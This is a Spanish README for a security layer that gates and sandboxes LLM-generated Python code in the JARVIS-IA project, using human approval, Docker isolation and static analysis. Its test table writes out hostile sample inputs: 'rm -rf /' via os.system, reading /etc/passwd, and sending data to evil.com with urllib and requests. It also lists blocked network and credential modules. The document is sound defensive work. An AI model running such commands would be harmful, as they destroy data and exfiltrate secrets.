# JARVIS-IA Auto-Programmer SEGURO

Sistema de proteccion de tres capas para la ejecucion segura de codigo Python generado por LLMs (Gemini, OpenRouter) en JARVIS-IA.

## Problematica

El `auto_programmer.py` original ejecutaba codigo generado por LLMs usando `subprocess.run()` con los mismos permisos del usuario, permitiendo:

- **Robo de API keys**: Acceso a variables de entorno y archivos de configuracion
- **Acceso a archivos personales**: Lectura/escritura de cualquier archivo del sistema
- **Conexiones a internet no autorizadas**: Exfiltracion de datos a servidores externos
- **Instalacion de malware**: Ejecucion de comandos arbitrarios del sistema

## Solucion: Tres Capas de Proteccion

### Capa 1: Human-in-the-loop (obligatorio)

Antes de ejecutar cualquier codigo, JARVIS **debe** obtener aprobacion explicita del usuario mostrando:

- El codigo completo que se va a ejecutar
- Analisis de permisos requeridos (archivos, red, sistema)
- Score de riesgo calculado (0-100)
- El usuario debe **APROBAR** explicitamente

**Reglas de aprobacion:**
- Si hay imports bloqueados -> NUNCA se aprueba automaticamente
- Si hay URLs en el codigo -> AUTOMATICAMENTE bloqueado
- Si el risk score > 50 -> AUTOMATICAMENTE bloqueado
- En modo `review` -> SIEMPRE requiere aprobacion humana

### Capa 2: Docker Sandbox (aislamiento real)

Si el usuario aprueba, el codigo se ejecuta en un contenedor Docker con restricciones extremas:

| Restriccion | Valor | Proposito |
|-------------|-------|-----------|
| `--network none` | Sin red | Evita exfiltracion de datos via internet |
| `--read-only` | Solo lectura | Previene modificacion del filesystem |
| `--memory 128m` | 128 MB RAM | Limita consumo de recursos |
| `--cpus 0.5` | 0.5 cores | Limita uso de CPU |
| `--pids-limit 50` | Max 50 procesos | Previene fork bombs |
| `--no-new-privileges` | Sin escalada | Evita privilege escalation |
| `--cap-drop ALL` | Sin capabilities | Elimina capabilities del kernel |
| `--rm` | Auto-destruccion | El contenedor se elimina al terminar |
| Timeout 10s | Max 10 segundos | Previene ejecucion infinita |

### Capa 3: Firewall de codigo (analisis estatico)

Antes de la ejecucion, se analiza el codigo con tres metodos:

1. **AST (Abstract Syntax Tree)**: Analisis estructural del codigo
   - Detecta imports peligrosos (`os`, `sys`, `urllib`, `socket`, etc.)
   - Detecta llamadas a funciones riesgosas (`open()`, `eval()`, `exec()`)
   - Analiza el arbol sintactico completo

2. **Regex patterns**: Deteccion de patrones de texto
   - Patrones de acceso al sistema (`os.system`, `subprocess.run`)
   - Patrones de red (`socket.connect`, `urllib.request`)
   - Patrones de ejecucion dinamica (`eval(`, `exec(`, `__import__(`)
   - Patrones de serializacion insegura (`pickle`, `yaml.load`)

3. **Heuristicas**: Deteccion de exfiltracion
   - URLs embebidas en strings
   - Direcciones IP hardcodeadas
   - Posible exposicion de credenciales

## Modos de Operacion

| Modo | Variable de Entorno | Descripcion | Seguridad |
|------|---------------------|-------------|-----------|
| **disabled** | `JARVIS_AUTO_CODE=disabled` | Bloquea completamente la ejecucion automatica | Maxima |
| **review** | `JARVIS_AUTO_CODE=review` | Requiere aprobacion humana para cada ejecucion (default) | Alta |
| **auto** | `JARVIS_AUTO_CODE=auto` | Aprueba automaticamente codigo con bajo riesgo | Solo desarrollo |

**Recomendacion**: Usar siempre `review` en produccion. El modo `auto` solo debe usarse en entornos de desarrollo aislados.

## Arquitectura

```
+------------------+     +------------------+     +------------------+
|   LLM Genera     | --> |  Capa 3: Firewall | --> |  Capa 1: Human   |
|   Codigo Python  |     |  Analisis estatico  |     |  Aprobacion      |
+------------------+     +------------------+     +------------------+
                                                          |
                                                          v
                                              +------------------+
                                              |  Capa 2: Docker  |
                                              |  Sandbox         |
                                              |  - Sin red       |
                                              |  - Sin filesystem|
                                              |  - Memoria limit |
                                              |  - CPU limit     |
                                              |  - Timeout       |
                                              +------------------+
                                                          |
                                                          v
                                              +------------------+
                                              |  Output seguro   |
                                              |  (o error)       |
                                              +------------------+
```

## Instalacion

### Requisitos

- Python 3.10+
- Docker Desktop (recomendado para sandbox completo)

### Pasos

1. **Instalar Docker Desktop** (recomendado):
   ```bash
   # macOS
   brew install --cask docker
   
   # Windows
   # Descargar desde https://www.docker.com/products/docker-desktop
   
   # Linux
   sudo apt-get install docker.io
   ```

2. **Copiar los archivos**:
   ```bash
   cp auto_programmer_secure.py /ruta/de/jarvis/lib/
   cp docker/Dockerfile /ruta/de/jarvis/docker/
   ```

3. **Configurar variable de entorno**:
   ```bash
   export JARVIS_AUTO_CODE=review  # Modo recomendado
   ```

4. **Reemplazar el import en el codigo original**:
   ```python
   # Antes (INSEGURO):
   # from auto_programmer import auto_programmer
   
   # Despues (SEGURO):
   from auto_programmer_secure import auto_programmer_secure, check_security_status
   ```

## Uso

### Ejecutar codigo seguro

```python
from auto_programmer_secure import auto_programmer_secure, check_security_status

# Verificar estado de seguridad
print(check_security_status())

# Ejecutar codigo (requiere aprobacion en modo review)
result = auto_programmer_secure({
    "code": "print('Hola mundo')",
    "tool_name": "hello_tool"
})
print(result)
```

### Generar reporte de seguridad

```python
from auto_programmer_secure import generate_security_report

code = """
import json
data = {"key": "value"}
print(json.dumps(data))
"""

report = generate_security_report(code, "json_tool")
print(report)
```

### Verificar si Docker esta disponible

```python
from auto_programmer_secure import check_security_status

status = check_security_status()
if status["docker_available"]:
    print("Docker sandbox activo - Maxima seguridad")
else:
    print("Docker no disponible - Usando fallback subprocess")
```

## Tests de Seguridad

El modulo incluye tests automaticos que validan el funcionamiento de las tres capas:

```bash
# Ejecutar todos los tests de seguridad
python auto_programmer_secure.py
```

Tests incluidos:

| Test | Codigo | Resultado Esperado |
|------|--------|-------------------|
| Codigo seguro basico | `print('Hola')` | APROBADO |
| Import bloqueado | `import os; os.system('rm -rf /')` | BLOQUEADO |
| Exfiltracion via urllib | `urllib.request.urlopen("https://evil.com")` | BLOQUEADO |
| Acceso a archivos | `open("/etc/passwd", "r")` | BLOQUEADO |
| Eval dinamico | `eval("__import__('os').system('id')")` | BLOQUEADO |
| Requests HTTP | `requests.post("https://evil.com", data=...)` | BLOQUEADO |
| Variables de entorno | `os.environ.get("API_KEY")` | BLOQUEADO |
| URL en string | `"https://evil.com/steal"` | BLOQUEADO |

## Imports Bloqueados

### Acceso al Sistema Operativo
- `os`, `sys`, `subprocess`, `socket`, `pathlib`, `shutil`

### Red y Comunicaciones
- `urllib`, `http`, `ftplib`, `smtplib`, `email`, `imaplib`, `poplib`, `telnetlib`, `ssl`, `asyncio`

### Librerias Externas de Red
- `requests`, `aiohttp`, `httpx`, `pycurl`, `paramiko`, `fabric`, `urllib3`

### Control GUI/Automatizacion
- `pyautogui`, `pynput`, `keyboard`, `mouse`

### Bases de Datos
- `sqlite3`, `psycopg2`, `pymongo`, `sqlalchemy`, `mysql`, `pymysql`, `redis`

### Frameworks Web
- `django`, `flask`, `fastapi`, `tornado`, `twisted`, `bottle`, `cherrypy`

### Serializacion Insegura
- `pickle`, `cPickle`, `shelve`, `dbm`, `dill`, `cloudpickle`

### Modulos de JARVIS
- `config`, `beta_config`, `api_keys`, `secrets`, `settings`, `credentials`, `auth`

## Calculo del Risk Score

El sistema calcula un score de riesgo de 0 a 100:

| Violacion | Puntaje |
|-----------|---------|
| Import bloqueado | +20 cada uno |
| Patron bloqueado (regex) | +15 cada uno |
| URL detectada | +30 |
| IP detectada | +25 |
| Acceso a archivos (open) | +15 |
| Acceso a variables de entorno | +20 |
| Import no listado | +10 cada uno |
| Posible exposicion de credenciales | +15 |
| Error de sintaxis | 100 (bloqueo total) |

**Umbrales:**
- **0-20**: Bajo riesgo - Requiere aprobacion en modo review
- **21-50**: Riesgo medio - Requiere aprobacion explicita
- **51-100**: Alto riesgo - BLOQUEADO automaticamente

## Fallback cuando Docker no esta disponible

Si Docker no esta instalado, el sistema utiliza un sandbox de fallback basado en `subprocess` con las siguientes restricciones:

- **Environment limpio**: Se eliminan todas las variables de entorno del sistema
- **PYTHONDONTWRITEBYTECODE**: Evita creacion de archivos `.pyc`
- **PYTHONNOUSERSITE**: Evita carga de site-packages del usuario
- **Directorio temporal aislado**: El codigo se ejecuta en un directorio temporal unico
- **Timeout de 5 segundos**: Menor que el timeout de Docker

**Advertencia**: Este fallback es **significativamente menos seguro** que el sandbox de Docker. Se recomienda instalar Docker Desktop para maxima proteccion.

## Integracion con JARVIS-IA

Para integrar este sistema en JARVIS-IA:

1. Reemplazar la llamada a `auto_programmer` por `auto_programmer_secure`
2. Mostrar la salida de `get_user_approval()` en la UI de JARVIS
3. Implementar el flujo de aprobacion en el frontend
4. Configurar `JARVIS_AUTO_CODE=review` en produccion

```python
# Ejemplo de integracion en JARVIS
from auto_programmer_secure import auto_programmer_secure, analyze_code_security

def handle_llm_code_request(parameters, player):
    # Analizar seguridad
    findings = analyze_code_security(parameters.get("code", ""))
    
    # Mostrar en UI
    player.show_security_review(
        code=parameters["code"],
        risk_score=findings["risk_score"],
        warnings=findings["warnings"],
        blocked=findings["blocked_imports"]
    )
    
    # Esperar aprobacion del usuario
    if player.wait_for_user_approval():
        return auto_programmer_secure(parameters, player)
    else:
        return "[USUARIO] Ejecucion rechazada por el usuario."
```

## Changelog

### v1.0.0
- Implementacion de las tres capas de seguridad
- Analisis AST + regex + heuristicas
- Docker sandbox con restricciones extremas
- Fallback subprocess para cuando Docker no esta disponible
- Tests de seguridad automaticos
- Modos de operacion (disabled/review/auto)

## Licencia

Este modulo es parte de JARVIS-IA y se distribuye bajo la misma licencia del proyecto.

---

**Nota de seguridad**: Este sistema reduce significativamente el riesgo de fuga de datos, pero ningun sistema es 100% infalible. Se recomienda:
- Usar siempre el modo `review` en produccion
- Mantener Docker actualizado
- Auditar periodicamente los imports bloqueados
- Monitorear los logs de ejecucion
